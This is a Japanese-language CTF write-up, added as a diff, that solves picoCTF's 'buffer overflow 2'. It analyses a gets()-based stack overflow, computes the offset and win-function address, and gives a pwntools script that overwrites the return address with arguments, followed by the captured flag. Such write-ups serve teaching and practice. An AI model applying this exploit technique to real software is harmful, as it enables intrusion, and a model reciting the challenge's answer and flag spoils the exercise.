@@ -1,0 +1,62 @@
+# buffer overflow 2:Binary Exploitation
+
+Control the return address and arguments\
+This time you'll need to control the arguments to the function you return to! Can you get the flag from this [program]()? You can view source [here](). And connect with it using `nc saturn.picoctf.net 60902`
+
+# Solution
+
+とりあえず`nc saturn.picoctf.net 60902`を実行してみる。
+```
+$ nc saturn.picoctf.net 60902
+Please enter your string: 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+```
+入力した文字がそのまま出てくるようだ。ソースコードを見てみる。
+```c
+void vuln(){
+  char buf[BUFSIZE];
+  gets(buf);
+  puts(buf);
+}
+```
+`BUFSIZE=100`でbufをそのまま出力している。
+```c
+void win(unsigned int arg1, unsigned int arg2) {
+  char buf[FLAGSIZE];
+  FILE *f = fopen("flag.txt","r");
+  if (f == NULL) {
+    printf("%s %s", "Please create 'flag.txt' in this directory with your",
+                    "own debugging flag.\n");
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  if (arg1 != 0xCAFEF00D)
+    return;
+  if (arg2 != 0xF00DF00D)
+    return;
+  printf(buf);
+}
+```
+flagが出てきそうなwin関数がある。`arg1==0xCAFEF00D`かつ`arg2==0xF00DF00D`である必要がありそうだ。win関数のアドレス値は`64: 08049296   162 FUNC    GLOBAL DEFAULT   15 win`より、0x08049296である。`何らかの文字列100+12文字+0x08049296+リターンアドレス+arg1+arg2`のような入力になるはず。
+
+以下、実行コード。
+```python
+from pwn import *
+
+p = remote("saturn.picoctf.net", 60902)
+
+payload = b"a"*112
+payload += p32(0x08049296)
+payload += p32(0x08049372) # ここは何でも良い
+payload += p32(0xCAFEF00D) + p32(0xF00DF00D)
+
+p.sendline(payload)
+
+p.interactive()
+```
+フラグが得られた。
+
+`picoCTF{argum3nt5_4_d4yZ_27ecbf40}`
+
